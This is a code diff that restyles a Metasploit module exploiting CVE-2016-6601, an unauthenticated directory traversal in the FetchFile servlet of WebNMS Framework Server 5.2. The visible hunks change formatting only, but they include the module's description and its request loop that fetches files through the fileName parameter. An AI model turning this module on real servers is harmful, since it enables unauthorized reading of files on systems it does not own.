@@ -12,27 +12,25 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name' => 'WebNMS Framework Server Arbitrary Text File Download',
-        'Description' => %q(
-This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an
-unauthenticated user to download files off the file system by using a directory
-traversal attack on the FetchFile servlet.
-Note that only text files can be downloaded properly, as any binary file will get
-mangled by the servlet. Also note that for Windows targets you can only download
-files that are in the same drive as the WebNMS installation.
-This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on
-Windows and Linux.
-),
-        'Author' =>
-          [
-            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
-          ],
+        'Description' => %q{
+          This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an
+          unauthenticated user to download files off the file system by using a directory
+          traversal attack on the FetchFile servlet.
+          Note that only text files can be downloaded properly, as any binary file will get
+          mangled by the servlet. Also note that for Windows targets you can only download
+          files that are in the same drive as the WebNMS installation.
+          This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on
+          Windows and Linux.
+        },
+        'Author' => [
+          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
+        ],
         'License' => MSF_LICENSE,
-        'References' =>
-          [
-            [ 'CVE', '2016-6601'],
-            [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],
-            [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]
-          ],
+        'References' => [
+          [ 'CVE', '2016-6601'],
+          [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],
+          [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]
+        ],
         'DisclosureDate' => '2016-07-04'
       )
     )
@@ -96,8 +94,8 @@ Windows and Linux.
       begin
         res = send_request_cgi(
           {
-            'uri'      => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
-            'method'   => 'GET',
+            'uri' => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
+            'method' => 'GET',
             'vars_get' => { 'fileName' => file_name }
           }
         )
@@ -112,6 +110,7 @@ Windows and Linux.
          (res.body.to_s.include? "File Found")
         return res.body.to_s
       end
+
       depth -= 1
     end
   end
